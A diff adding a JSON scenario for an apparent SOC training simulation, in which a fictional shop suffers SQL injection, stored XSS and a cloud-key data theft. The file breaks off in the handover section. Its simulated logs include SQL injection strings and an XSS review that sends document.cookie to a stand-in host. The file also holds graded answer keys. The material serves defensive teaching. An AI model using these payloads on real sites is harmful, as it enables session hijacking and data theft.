@@ -1,0 +1,844 @@
+{
+ "id": "shift-04",
+ "title": "Morning shift: Wrenfield & Co",
+ "agency": "Lanternfield Security Operations",
+ "client": "Wrenfield & Co",
+ "date": "Thursday 19 November",
+ "startsAt": "09:50",
+ "minutes": 25,
+ "xp": 120,
+ "summary": "An online shop's web app was probed overnight, an admin's session was stolen this morning, and a cloud bucket of customer data is being downloaded. Work out whether it's one attack, stop the data loss, and hand over.",
+ "card": "A web app, a stolen admin session, a cloud bucket walking out",
+ "lessons": [
+  "web-sqli",
+  "web-xss",
+  "web-access",
+  "cloud",
+  "incident-response",
+  "soc"
+ ],
+ "briefing": "Morning. Wrenfield & Co run an online homeware shop on their own web app, and we watch the web logs, the app's audit log and their cloud. A few alerts are in and more may land. Anything that moves customer data is top priority. Check each one, link what belongs together, and get the other teams to act. The clock only moves when you do something.",
+ "lead": "Morgan, shift lead",
+ "leadPhoto": "img/agency/morgan.webp",
+ "handedOverBy": "the night shift",
+ "next": {
+  "href": "#lab-sqli-log",
+  "label": "Read a web server log for SQL injection"
+ },
+ "simplification": "Simplified simulation: a real shift has far more traffic and longer logs. The web/WAF, application and cloud logs are generic SIEM exports written for this shift; the attack techniques (SQL injection with a UNION, stored XSS stealing a session cookie, walking record IDs, and an access key used from outside) and the tool name sqlmap are real, and the cloud events follow AWS CloudTrail's names (ListBucket, GetObject). Documentation addresses have no real location, so there are no countries here. Department replies are scripted. All people and companies are fictional.",
+ "costs": {
+  "search": 1,
+  "request": 2,
+  "close": 3,
+  "wait": 5
+ },
+ "sources": {
+  "weblog": {
+   "name": "Web and WAF log: shop.wrenfield.example (SIEM export)",
+   "about": "Requests to the public web app, with the WAF's verdict. The WAF logs but doesn't block by default. Generic format, simplified for this shift.",
+   "lines": [
+    "2026-11-19 02:10:44 app=waf verdict=allow src=203.0.113.90 req=\"GET /products?id=55 HTTP/1.1\" status=200 ua=\"sqlmap/1.8.11\"",
+    "2026-11-19 02:10:46 app=waf verdict=allow src=203.0.113.90 req=\"GET /products?id=55' HTTP/1.1\" status=500 ua=\"sqlmap/1.8.11\"",
+    "2026-11-19 02:11:02 app=waf verdict=allow src=203.0.113.90 req=\"GET /products?id=55 AND 1=1 HTTP/1.1\" status=200 ua=\"sqlmap/1.8.11\"",
+    "2026-11-19 02:12:20 app=waf verdict=allow src=203.0.113.90 req=\"GET /products?id=-1 UNION SELECT NULL,email,password_hash,NULL FROM users-- HTTP/1.1\" status=200 size=61240 ua=\"sqlmap/1.8.11\"",
+    "2026-11-19 03:01:50 app=waf verdict=allow src=198.51.100.50 req=\"GET /login?x=<script>alert(1)</script> HTTP/1.1\" status=200 ua=\"SecureCheck-Scanner/4\" note=\"authorised scan CHG-5210\"",
+    "2026-11-19 03:04:12 app=waf verdict=allow src=198.51.100.50 req=\"GET /search?q=1' OR '1'='1 HTTP/1.1\" status=200 ua=\"SecureCheck-Scanner/4\" note=\"authorised scan CHG-5210\"",
+    "2026-11-19 08:58:33 app=auth verdict=allow src=198.51.100.22 user=s.okafor req=\"POST /admin/login HTTP/1.1\" status=302 note=\"MFA ok\"",
+    "2026-11-19 09:15:07 app=auth verdict=allow src=203.0.113.90 req=\"POST /admin/login HTTP/1.1\" status=302 note=\"session reused, no password\""
+   ],
+   "findings": [
+    {
+     "id": "sqli-probe",
+     "match": "GET /products?id=55' HTTP",
+     "finding": "203.0.113.90 sent SQL injection probes to /products (a stray quote, then AND 1=1), from the sqlmap tool."
+    },
+    {
+     "id": "sqli-union",
+     "match": "UNION SELECT NULL,email,password_hash,NULL FROM users",
+     "finding": "A UNION query read email and password_hash from the users table; the 61 KB reply (far bigger than a product page) says it worked."
+    },
+    {
+     "id": "admin-newip",
+     "match": "POST /admin/login HTTP/1.1\" status=302 note=\"session reused",
+     "finding": "At 09:15 the admin panel was entered from 203.0.113.90 with a reused session and no password: a stolen session cookie."
+    },
+    {
+     "id": "admin-usual",
+     "match": "src=198.51.100.22 user=s.okafor",
+     "finding": "s.okafor, the real admin, signs in from the office (198.51.100.22) with MFA at 08:58."
+    },
+    {
+     "id": "scan-note",
+     "match": "authorised scan CHG-5210",
+     "finding": "The 03:00 attack-looking requests are from 198.51.100.50, the client's approved scanner (CHG-5210)."
+    }
+   ]
+  },
+  "applog": {
+   "name": "Application audit log: Wrenfield shop (SIEM export)",
+   "about": "What happened inside the app: reviews posted, admin pages viewed, customer records read. Generic format, simplified for this shift.",
+   "lines": [
+    "2026-11-18 21:40:11 event=review_created user=guest id=REV-8842 product=lamp text=\"Great lamp! <script>fetch('https://collect.grab-metrics.example/c?k='+document.cookie)</script>\"",
+    "2026-11-19 09:12:03 event=admin_view user=s.okafor actor_ip=198.51.100.22 page=review_queue",
+    "2026-11-19 09:12:04 event=outbound_from_page page=review_queue dst=collect.grab-metrics.example note=\"a script request carrying the admin session cookie\"",
+    "2026-11-19 09:16:40 event=order_view actor_ip=203.0.113.90 order=ORD-10044 owner=cust-3321",
+    "2026-11-19 09:16:41 event=order_view actor_ip=203.0.113.90 order=ORD-10043 owner=cust-2890",
+    "2026-11-19 09:16:41 event=order_view actor_ip=203.0.113.90 order=ORD-10042 owner=cust-5107",
+    "... 400 more order_view lines from 203.0.113.90, one order number lower each time, each a different owner ...",
+    "2026-11-19 09:24:50 event=admin_view actor_ip=203.0.113.90 page=integrations note=\"storage access key shown on screen\""
+   ],
+   "findings": [
+    {
+     "id": "xss-review",
+     "match": "<script>fetch('https://collect.grab-metrics.example",
+     "finding": "Review REV-8842 contains a script that sends the reader's cookie to collect.grab-metrics.example: stored XSS, saved the night before."
+    },
+    {
+     "id": "xss-fired",
+     "match": "event=admin_view user=s.okafor actor_ip=198.51.100.22 page=review_queue",
+     "finding": "At 09:12 admin s.okafor opened the review queue from the office, which ran the script in her browser."
+    },
+    {
+     "id": "cookie-out",
+     "match": "a script request carrying the admin session cookie",
+     "finding": "The script sent s.okafor's admin session cookie out to collect.grab-metrics.example."
+    },
+    {
+     "id": "idor",
+     "match": "event=order_view actor_ip=203.0.113.90",
+     "finding": "From 203.0.113.90 the stolen session read customer orders one ID at a time (ORD-10044 downwards), each a different owner: broken access control (IDOR)."
+    },
+    {
+     "id": "key-shown",
+     "match": "page=integrations note=\"storage access key shown on screen\"",
+     "finding": "The attacker opened the Integrations settings, where the cloud storage access key is shown on screen."
+    }
+   ]
+  },
+  "cloud": {
+   "name": "Cloud audit log: Wrenfield (CloudTrail export)",
+   "about": "Actions in Wrenfield's cloud account, one per line. Generic format; the event names are AWS's. Simplified for this shift.",
+   "lines": [
+    "2026-11-19 01:00:05 eventName=GetObject user=svc-analytics src=198.51.100.33 resource=wrenfield-warehouse/nightly/2026-11-19.parquet",
+    "2026-11-19 01:14:52 eventName=GetObject user=svc-analytics src=198.51.100.33 resource=wrenfield-warehouse/nightly/2026-11-19-b.parquet note=\"scheduled analytics export, 180 GB over the hour\"",
+    "2026-11-19 09:41:12 eventName=ListBucket user=AKIA-WRENFIELD-APP src=203.0.113.90 resource=wrenfield-exports",
+    "2026-11-19 09:41:20 eventName=GetObject user=AKIA-WRENFIELD-APP src=203.0.113.90 resource=wrenfield-exports/customers/2026-11.csv",
+    "2026-11-19 09:41:21 eventName=GetObject user=AKIA-WRENFIELD-APP src=203.0.113.90 resource=wrenfield-exports/customers/2026-10.csv",
+    "... 60 more GetObject lines from AKIA-WRENFIELD-APP at 203.0.113.90, 4.8 GB of customer exports in total ..."
+   ],
+   "findings": [
+    {
+     "id": "key-listbucket",
+     "match": "eventName=ListBucket user=AKIA-WRENFIELD-APP src=203.0.113.90",
+     "finding": "At 09:41 the app's storage key (AKIA-WRENFIELD-APP) was used from 203.0.113.90 to list the wrenfield-exports bucket."
+    },
+    {
+     "id": "key-getobject",
+     "match": "GetObject user=AKIA-WRENFIELD-APP src=203.0.113.90",
+     "finding": "The same key downloaded customer export files (4.8 GB) from wrenfield-exports: client data exfiltrated."
+    },
+    {
+     "id": "analytics-ok",
+     "match": "user=svc-analytics src=198.51.100.33",
+     "finding": "The overnight cloud egress is svc-analytics reading the warehouse from 198.51.100.33, on schedule: that's the nightly export, not an attack."
+    }
+   ]
+  },
+  "notes": {
+   "name": "Client notes: Wrenfield & Co",
+   "about": "What Lanternfield knows about this client: the app, accounts, cloud and recent changes.",
+   "lines": [
+    "Client: Wrenfield & Co, an online homeware shop, about 60 staff. The shop runs on their own web app at shop.wrenfield.example. Lanternfield watches the web/WAF, the app audit log and their cloud.",
+    "On-call client IT: Nadia Shah, reachable until 18:00. Report confirmed incidents to Nadia.",
+    "Admins sign in to the admin panel with MFA from the office (198.51.100.22). Admin session cookies last 8 hours.",
+    "The app's storage key AKIA-WRENFIELD-APP can read the wrenfield-exports bucket (nightly customer exports). It should only be used by the app server (198.51.100.22), never from outside.",
+    "A scheduled analytics export (svc-analytics copies the warehouse nightly at 01:00, from 198.51.100.33) means some cloud egress every night is normal.",
+    "CHG-5210: the monthly approved vulnerability scan runs 03:00 to 03:30 from the scanner at 198.51.100.50.",
+    "The web app is written in-house. The WAF logs requests but doesn't block by default. Dev can ship a fix (parameterised queries, output encoding on reviews, an ownership check on orders) within a day.",
+    "Network Ops can block single addresses on request. Taking the whole shop offline needs the business's say-so."
+   ],
+   "findings": [
+    {
+     "id": "oncall",
+     "match": "Nadia Shah",
+     "finding": "On-call client IT is Nadia Shah, reachable until 18:00; confirmed incidents go to her."
+    },
+    {
+     "id": "appkey-note",
+     "match": "never from outside",
+     "finding": "Client notes: the app's storage key should only be used by the app server (198.51.100.22), never from outside."
+    },
+    {
+     "id": "analytics-note",
+     "match": "svc-analytics copies the warehouse nightly at 01:00",
+     "finding": "Client notes: a scheduled export (svc-analytics) copies the warehouse nightly at 01:00, so some cloud egress overnight is normal."
+    },
+    {
+     "id": "scanner-note",
+     "match": "CHG-5210",
+     "finding": "Client notes: CHG-5210, the approved monthly vulnerability scan, runs 03:00 to 03:30 from 198.51.100.50."
+    },
+    {
+     "id": "dev-fix",
+     "match": "parameterised queries",
+     "finding": "Client notes: dev can ship parameterised queries, output encoding on reviews and an ownership check on orders within a day."
+    },
+    {
+     "id": "admin-mfa",
+     "match": "Admin session cookies last 8 hours",
+     "finding": "Client notes: admins use MFA from the office, and admin session cookies last 8 hours (long enough to steal and reuse)."
+    }
+   ]
+  }
+ },
+ "alerts": [
+  {
+   "id": "a1",
+   "ref": "SOC-40551",
+   "title": "SQL injection against the shop's web app",
+   "time": "02:13",
+   "severity": "high",
+   "arrives": {
+    "at": 0
+   },
+   "detection": "203.0.113.90 sent SQL injection to /products overnight, including a UNION query against the users table, and the WAF let it through.",
+   "guide": {
+    "hints": [
+     "Open the web/WAF log and read what 203.0.113.90 sent to /products. A stray quote, then AND 1=1, then a UNION: that's someone mapping and then using SQL injection.",
+     "Did it work? Compare the size of the UNION reply with a normal product page, and remember the WAF here only logs. Then think about the real fix in the notes.",
+     "The UNION pulled email and password_hash from the users table: a data breach. Add a WAF block rule now as a stopgap, block 203.0.113.90, and report it. The lasting fix is parameterised queries. Link it to the admin session and the cloud download."
+    ],
+    "searches": [
+     [
+      "weblog",
+      "UNION SELECT"
+     ],
+     [
+      "weblog",
+      "sqlmap"
+     ],
+     [
+      "notes",
+      "parameterised queries"
+     ]
+    ]
+   },
+   "sources": [
+    "weblog",
+    "notes"
+   ],
+   "requests": [
+    "endpoint:waf-rule",
+    "netops:block-ip",
+    "client:report-incident",
+    "client:take-site-offline"
+   ],
+   "evidence": [
+    {
+     "findings": [
+      "sqli-probe"
+     ],
+     "text": "WAF log: 203.0.113.90 probed /products with a stray quote and AND 1=1, from the sqlmap tool",
+     "supports": true,
+     "required": true,
+     "why": "The probing pattern is SQL injection, not a normal customer."
+    },
+    {
+     "findings": [
+      "sqli-union"
+     ],
+     "text": "WAF log: a UNION query read email and password_hash from the users table, and the 61 KB reply says it returned data",
+     "supports": true,
+     "required": true,
+     "why": "This is the breach: the users table was read out through the page."
+    },
+    {
+     "findings": [
+      "dev-fix"
+     ],
+     "text": "Client notes: the real fix is parameterised queries, which dev can ship within a day",
+     "supports": true,
+     "required": false,
+     "why": "What actually closes the hole, beyond the WAF stopgap."
+    },
+    {
+     "text": "The WAF logged every request, so the site was protected",
+     "supports": false,
+     "required": false,
+     "why": "This WAF logs but doesn't block by default (it's in the notes), and the UNION returned data, so nothing stopped it."
+    }
+   ],
+   "answer": {
+    "verdict": "act",
+    "severity": [
+     "high",
+     "critical"
+    ],
+    "related": [
+     "a2",
+     "a3"
+    ],
+    "contain": [
+     "endpoint:waf-rule",
+     "netops:block-ip",
+     "client:report-incident"
+    ],
+    "status": "escalated",
+    "summaries": [
+     "SQL injection from 203.0.113.90 against /products read email and password_hash from the users table overnight (UNION, 61 KB reply); the WAF only logged it. A WAF block rule is in as a stopgap, 203.0.113.90 blocked, Nadia told. Dev to ship parameterised queries. Same attacker as SOC-40556 and SOC-40560.",
+     "Someone ran odd queries against the shop overnight. The WAF logged them, so no action.",
+     "Possible SQL injection on /products. Suggest dev look at it when they can."
+    ],
+    "summary": 0,
+    "why": "A UNION that returns the users table is a breach: even hashed passwords can be cracked offline, so the data has to be treated as exposed. A WAF rule is a stopgap to stop more now; the real fix is parameterised queries so input can never change the query. Block the source and report it."
+   }
+  },
+  {
+   "id": "a2",
+   "ref": "SOC-40556",
+   "title": "Admin session stolen through a review",
+   "time": "09:16",
+   "severity": "high",
+   "arrives": {
+    "at": 0
+   },
+   "detection": "An admin signed into the panel from 203.0.113.90 with a reused session and no password, minutes after opening the review queue, and then read hundreds of customer orders.",
+   "guide": {
+    "hints": [
+     "Start in the app audit log. A review was posted last night; read its text. Then see what happened when admin s.okafor opened the review queue this morning.",
+     "The review hides a script that sends the reader's cookie out. Who then signs into the admin panel, from where, and with what? Compare it to how s.okafor normally signs in.",
+     "Stored XSS stole s.okafor's session cookie; the attacker reused it from 203.0.113.90 and walked customer orders by ID (broken access control). Reset s.okafor and end her sessions, remove the review, and block the IP. Link it to the SQL injection and the cloud download."
+    ],
+    "searches": [
+     [
+      "applog",
+      "<script>"
+     ],
+     [
+      "applog",
+      "review_queue"
+     ],
+     [
+      "weblog",
+      "session reused"
+     ]
+    ]
+   },
+   "sources": [
+    "applog",
+    "weblog",
+    "notes"
+   ],
+   "requests": [
+    "identity:reset-admin",
+    "endpoint:takedown-xss",
+    "netops:block-ip",
+    "servicedesk:call-admin"
+   ],
+   "evidence": [
+    {
+     "findings": [
+      "xss-review"
+     ],
+     "text": "App log: review REV-8842 hides a script that sends the reader's cookie to collect.grab-metrics.example (stored XSS)",
+     "supports": true,
+     "required": true,
+     "why": "This is the weapon: a script saved on the site that runs for whoever views the review."
+    },
+    {
+     "findings": [
+      "xss-fired",
+      "cookie-out"
+     ],
+     "text": "App log: admin s.okafor opened the review queue at 09:12 and the script sent her session cookie out",
+     "supports": true,
+     "required": true,
+     "why": "Shows the script firing in the admin's browser and the cookie leaving."
+    },
+    {
+     "findings": [
+      "admin-newip"
+     ],
+     "text": "WAF log: at 09:15 the admin panel was entered from 203.0.113.90 with a reused session and no password",
+     "supports": true,
+     "required": true,
+     "why": "The stolen cookie in use: logged in as the admin without needing her password or MFA."
+    },
+    {
+     "findings": [
+      "idor"
+     ],
+     "text": "App log: that session then read customer orders one ID at a time, each a different owner",
+     "supports": true,
+     "required": false,
+     "why": "What they did with it, and a second flaw: the app never checks the order belongs to the person asking (IDOR)."
+    },
+    {
+     "findings": [
+      "admin-confirms"
+     ],
+     "text": "Service Desk: s.okafor opened the review queue but didn't go to Integrations or download anything",
+     "supports": true,
+     "required": false,
+     "why": "Separates what she did from what the attacker did with her session."
+    },
+    {
+     "text": "s.okafor logged into the admin panel, so this is just normal admin work",
+     "supports": false,
+     "required": false,
+     "why": "Her real login is from the office (198.51.100.22) with MFA at 08:58. The 09:15 entry reused a stolen cookie from a different IP."
+    }
+   ],
+   "answer": {
+    "verdict": "act",
+    "severity": [
+     "high",
+     "critical"
+    ],
+    "related": [
+     "a1",
+     "a3"
+    ],
+    "contain": [
+     "identity:reset-admin",
+     "endpoint:takedown-xss",
+     "netops:block-ip"
+    ],
+    "status": "escalated",
+    "summaries": [
+     "Stored XSS in review REV-8842 stole admin s.okafor's session cookie when she opened the review queue (09:12); the attacker reused it from 203.0.113.90 (09:15), read customer orders by walking IDs (broken access control) and opened Integrations. s.okafor reset with sessions ended, the review removed, 203.0.113.90 blocked. Same attacker as SOC-40551 and SOC-40560.",
+     "s.okafor logged into the admin panel and looked at some orders. Normal admin work; no action.",
+     "Admin account for s.okafor may be shared. Suggest she changes her password."
+    ],
+    "summary": 0,
+    "why": "A session cookie proves you've already logged in, so stealing one gets past the password and MFA. Ending her sessions matters as much as resetting the password. Remove the stored script so it stops running, and encode review text so a review can't become code. The order-walking is a second bug (missing ownership checks) for dev to fix."
+   }
+  },
+  {
+   "id": "a3",
+   "ref": "SOC-40560",
+   "title": "Customer data bucket downloaded with the app's key",
+   "time": "09:42",
+   "severity": "critical",
+   "arrives": {
+    "closed": 2,
+    "at": 20
+   },
+   "detection": "The app's cloud storage key is being used from 203.0.113.90 to list and download the whole customer exports bucket.",
+   "guide": {
+    "hints": [
+     "Open the cloud log. The app's storage key (AKIA-WRENFIELD-APP) is listing and downloading the exports bucket. Where from, and is that where the key is supposed to be used?",
+     "The notes say that key should only be used by the app server. It's being used from 203.0.113.90, the attacker's address, right after they opened Integrations. How much is leaving?",
+     "The key leaked through the stolen admin session, and 4.8 GB of customer exports are being downloaded: the real breach. Rotate the key and lock the bucket now, block the IP, and report it. Link it to the SQL injection and the stolen session."
+    ],
+    "searches": [
+     [
+      "cloud",
+      "AKIA-WRENFIELD-APP"
+     ],
+     [
+      "cloud",
+      "GetObject"
+     ],
+     [
+      "notes",
+      "never from outside"
+     ]
+    ]
+   },
+   "sources": [
+    "cloud",
+    "notes"
+   ],
+   "requests": [
+    "client:rotate-key",
+    "client:report-incident",
+    "netops:block-ip",
+    "client:take-site-offline"
+   ],
+   "evidence": [
+    {
+     "findings": [
+      "key-listbucket",
+      "key-getobject"
+     ],
+     "text": "Cloud log: the app's key was used from 203.0.113.90 to list and download the wrenfield-exports bucket (4.8 GB of customer exports)",
+     "supports": true,
+     "required": true,
+     "why": "Customer data leaving the cloud is the breach, happening right now."
+    },
+    {
+     "findings": [
+      "appkey-note"
+     ],
+     "text": "Client notes: that key should only be used by the app server (198.51.100.22), never from outside",
+     "supports": true,
+     "required": true,
+     "why": "Shows this isn't the app doing its job: the key is being used from the wrong place."
+    },
+    {
+     "findings": [
+      "key-shown"
+     ],
+     "text": "App log: the key was shown in the Integrations page the stolen admin session opened",
+     "supports": true,
+     "required": false,
+     "why": "How the attacker got the key: straight from the admin panel."
+    },
+    {
+     "text": "It's the app's own storage key, so this is the application doing its normal job",
+     "supports": false,
+     "required": false,
+     "why": "The app uses the key from 198.51.100.22. This is the same key used from the attacker's address to bulk-download customer files."
+    }
+   ],
+   "answer": {
+    "verdict": "act",
+    "severity": [
+     "critical"
+    ],
+    "related": [
+     "a1",
+     "a2"
+    ],
+    "contain": [
+     "client:rotate-key",
+     "client:report-incident",
+     "netops:block-ip"
+    ],
+    "status": "escalated",
+    "summaries": [
+     "Data breach: the app's storage key (AKIA-WRENFIELD-APP), taken from the admin panel through the stolen session, was used from 203.0.113.90 to download 4.8 GB of customer exports from wrenfield-exports. Key revoked and rotated, the bucket locked to the app server, 203.0.113.90 blocked, Nadia told to run the breach process. One incident with SOC-40551 and SOC-40556.",
+     "The app's key downloaded some files from the bucket. That's what the app does; no action.",
+     "Large cloud download on Wrenfield's account. Worth reviewing their bucket permissions tomorrow."
+    ],
+    "summary": 0,
+    "why": "This is where the customer data actually leaves. A long-lived key with wide access, readable from the admin panel, is the weak point: revoke and rotate it at once and lock the bucket so only the app server can read it. Better still, the app should get short-lived credentials, not a standing key. Blocking the download now limits what else goes."
+   }
+  },
+  {
+   "id": "a4",
+   "ref": "SOC-40548",
+   "title": "Attack-looking requests from a scanner overnight",
+   "time": "03:05",
+   "severity": "low",
+   "arrives": {
+    "at": 0
+   },
+   "detection": "The WAF logged injection-looking requests to the login and search pages from 198.51.100.50 around 03:00.",
+   "guide": {
+    "hints": [
+     "These look like attacks, but check who sent them and whether anything's booked in. The client notes mention a scan.",
+     "198.51.100.50 with a change ticket is the client's own approved scanner. Don't block the people the client pays to test them."
+    ],
+    "searches": [
+     [
+      "weblog",
+      "authorised scan"
+     ],
+     [
+      "notes",
+      "CHG-5210"
+     ]
+    ]
+   },
+   "sources": [
+    "weblog",
+    "notes"
+   ],
+   "requests": [
+    "netops:block-scanner"
+   ],
+   "evidence": [
+    {
+     "findings": [
+      "scan-note",
+      "scanner-note"
+     ],
+     "text": "WAF log and notes: the 03:00 requests are from 198.51.100.50, the client's approved scanner, under CHG-5210",
+     "supports": true,
+     "required": true,
+     "why": "A known address with an approved change: it's the monthly security scan, not an intruder."
+    },
+    {
+     "text": "Injection-looking requests hitting the login and search pages overnight mean an intrusion, so block the source",
+     "supports": false,
+     "required": false,
+     "why": "The source is the authorised scanner. Blocking it would stop the client's own security testing and tell you nothing."
+    }
+   ],
+   "answer": {
+    "verdict": "legit",
+    "severity": [
+     "low"
+    ],
+    "related": [],
+    "contain": [],
+    "status": "closed",
+    "summaries": [
+     "False alarm: the 03:00 injection-looking traffic is the client's approved monthly scan (CHG-5210) from 198.51.100.50. No action; worth marking the scanner so it doesn't alert next month.",
+     "Attack traffic overnight from 198.51.100.50. Blocked the source.",
+     "Possible intrusion attempt. Escalated to the client."
+    ],
+    "summary": 0,
+    "why": "Approved scanners send attack-looking requests on purpose. Check the source and the change calendar before acting: this one is booked in, from a known address, so it's noise, not the real attack from 203.0.113.90."
+   }
+  },
+  {
+   "id": "a5",
+   "ref": "SOC-40550",
+   "title": "Overnight spike in cloud egress",
+   "time": "09:05",
+   "severity": "medium",
+   "arrives": {
+    "at": 0
+   },
+   "detection": "Wrenfield's cloud account moved far more data than usual overnight, and a cost alert fired this morning.",
+   "guide": {
+    "hints": [
+     "A jump in cloud data leaving can be exfiltration, or a big scheduled job. Open the cloud log and the notes.",
+     "The overnight egress is svc-analytics reading the warehouse at 01:00 from a known internal address, on schedule. That's not the attack; the bucket download at 09:41 is."
+    ],
+    "searches": [
+     [
+      "cloud",
+      "svc-analytics"
+     ],
+     [
+      "notes",
+      "svc-analytics copies the warehouse nightly at 01:00"
+     ]
+    ]
+   },
+   "sources": [
+    "cloud",
+    "notes"
+   ],
+   "requests": [
+    "endpoint:pause-export"
+   ],
+   "evidence": [
+    {
+     "findings": [
+      "analytics-ok",
+      "analytics-note"
+     ],
+     "text": "Cloud log and notes: the overnight egress is svc-analytics copying the warehouse at 01:00 from 198.51.100.33, on schedule",
+     "supports": true,
+     "required": true,
+     "why": "A known internal job at its usual time explains the size: it isn't the attack."
+    },
+    {
+     "text": "A big jump in cloud data leaving overnight is exfiltration, so lock the account",
+     "supports": false,
+     "required": false,
+     "why": "This is the scheduled nightly analytics export from a known address. The real exfil is the 09:41 bucket download by the app key, which is a separate alert."
+    }
+   ],
+   "answer": {
+    "verdict": "legit",
+    "severity": [
+     "low",
+     "medium"
+    ],
+    "related": [],
+    "contain": [],
+    "status": "closed",
+    "summaries": [
+     "False alarm: the overnight egress is the scheduled analytics export (svc-analytics, 01:00, from 198.51.100.33), about 180 GB as usual. Not related to the bucket download at 09:41. Worth tuning the cost alert.",
+     "Large data egress overnight, possibly exfiltration. Paused the export job.",
+     "Cloud cost spike on Wrenfield's account. Escalated to the client."
+    ],
+    "summary": 0,
+    "why": "A cost or egress alert can't tell a scheduled export from theft. The cloud log and the change notes can: this is the nightly warehouse copy from a known internal address. Don't confuse it with the customer-bucket download by the app key, which is the real breach."
+   }
+  }
+ ],
+ "departments": {
+  "identity": {
+   "name": "Identity & Access",
+   "contact": {
+    "name": "Priya Raman",
+    "photo": "img/agency/priya.webp",
+    "role": "Identity & Access"
+   },
+   "requests": [
+    {
+     "id": "reset-admin",
+     "label": "Reset s.okafor's password, end all her admin sessions and reset her tokens",
+     "minutes": 10,
+     "replies": [
+      {
+       "when": {
+        "attached": ""
+       },
+       "minutes": 4,
+       "outcome": "asks",
+       "text": "She's the shop's main admin, so put a reason on the ticket before I lock her out. Attach a finding and send it again."
+      },
+      {
+       "outcome": "done",
+       "text": "Done. s.okafor's password is reset and every admin session is ended, including the one reused from 203.0.113.90, so the stolen cookie is now useless. She'll sign in fresh with MFA."
+      }
+     ]
+    }
+   ]
+  },
+  "endpoint": {
+   "name": "Endpoint & Email Security",
+   "contact": {
+    "name": "Elliot Marsh",
+    "photo": "img/agency/elliot.webp",
+    "role": "Endpoint & Email Security"
+   },
+   "requests": [
+    {
+     "id": "waf-rule",
+     "label": "Add a WAF block rule (virtual patch) for the /products injection and turn blocking on for it",
+     "minutes": 8,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done. A WAF rule now blocks the injection pattern on /products, so the same trick is stopped while dev writes the real fix. It's a stopgap, not a cure."
+      }
+     ]
+    },
+    {
+     "id": "takedown-xss",
+     "label": "Remove review REV-8842 and purge the stored script from the site",
+     "minutes": 8,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done. Review REV-8842 is removed and the cached copies are purged, so the script won't run for anyone else. Dev still needs to encode review text so this can't happen again."
+      }
+     ]
+    },
+    {
+     "id": "pause-export",
+     "label": "Pause the nightly analytics export job",
+     "minutes": 5,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done, the analytics export is paused. For what it's worth, that was the scheduled warehouse copy, not the attack, so the reporting team will be chasing missing data in the morning.",
+       "cost": "Paused the scheduled analytics export, which was the normal nightly warehouse copy, not the breach (the bucket download by the app key was)."
+      }
+     ]
+    }
+   ]
+  },
+  "netops": {
+   "name": "Network Operations",
+   "contact": {
+    "name": "Tomasz Nowak",
+    "photo": "img/agency/tomasz.webp",
+    "role": "Network Operations"
+   },
+   "requests": [
+    {
+     "id": "block-ip",
+     "label": "Block 203.0.113.90 at the edge and the WAF",
+     "minutes": 6,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done. 203.0.113.90 is blocked at the edge and the WAF, so it can't reach the shop or the admin panel again. No other addresses were doing the same thing."
+      }
+     ]
+    },
+    {
+     "id": "block-scanner",
+     "label": "Block 198.51.100.50 (the overnight scanner)",
+     "minutes": 5,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Done, 198.51.100.50 is blocked. Heads up: that's the client's own approved scanner (CHG-5210), so next month's security scan will fail until someone unblocks it.",
+       "cost": "Blocked the client's approved vulnerability scanner, which the notes flagged under CHG-5210, so their own testing will fail."
+      }
+     ]
+    }
+   ]
+  },
+  "servicedesk": {
+   "name": "Service Desk",
+   "contact": {
+    "name": "Grace Adeyemi",
+    "photo": "img/agency/grace.webp",
+    "role": "Service Desk"
+   },
+   "requests": [
+    {
+     "id": "call-admin",
+     "label": "Call s.okafor about the admin panel activity",
+     "minutes": 10,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Spoke to s.okafor. She came in at 09:00, opened the review queue once, and that's all; she didn't go into Integrations and hasn't downloaded anything. She's at her desk now.",
+       "finding": {
+        "id": "admin-confirms",
+        "finding": "Service Desk: s.okafor opened the review queue once from the office and did nothing else; she didn't open Integrations or download anything."
+       }
+      }
+     ]
+    }
+   ]
+  },
+  "client": {
+   "name": "Nadia Shah (Wrenfield IT)",
+   "contact": {
+    "name": "Nadia Shah",
+    "role": "Client: Wrenfield IT"
+   },
+   "requests": [
+    {
+     "id": "rotate-key",
+     "label": "Revoke and rotate the AKIA-WRENFIELD-APP storage key and lock the exports bucket to the app server",
+     "minutes": 12,
+     "replies": [
+      {
+       "when": {
+        "attached": ""
+       },
+       "minutes": 4,
+       "outcome": "asks",
+       "text": "Rotating a live key will break the shop for a few minutes while we swap it in. Give me a reason on the ticket and I'll do it now."
+      },
+      {
+       "outcome": "done",
+       "text": "Done. The old key is revoked, so the downloads just stopped, and a new one is in the app. I've locked wrenfield-exports so only the app server can read it. We'll move the app to short-lived credentials next."
+      }
+     ]
+    },
+    {
+     "id": "report-incident",
+     "label": "Report a confirmed breach: the users table read by SQL injection, an admin session stolen, and customer exports downloaded",
+     "minutes": 15,
+     "replies": [
+      {
+       "outcome": "done",
+       "text": "Thanks for catching this. I'm starting our incident plan and getting our data protection lead to assess the breach, including whether we tell the ICO and customers. Send me the timeline when you can."
+      }
+     ]
+    },
+    {
+     "id": "take-site-offline",
+     "label": "Take the whole shop offline",
+     "minutes": 5,
+     "replies": [
+      {
+       "outcome": "refused",
+       "text": "I can't pull the shop down without the business's call, and it's a blunt instrument mid-morning. If you want the attacker stopped now, ask us to block 203.0.113.90, add the WAF rule and rotate the key instead and we'll do all three straight away."
+      }
+     ]
+    }
+   ]
+  }
+ },
+ "handover": {
+  "links": "Three alerts were one attack from 203.0.113.90: SQL injection read the users table overnight, stored XSS stole an admin's session this morning, and that session handed over a cloud key used to download the customer bucket. Seeing them as one incident is the job.",
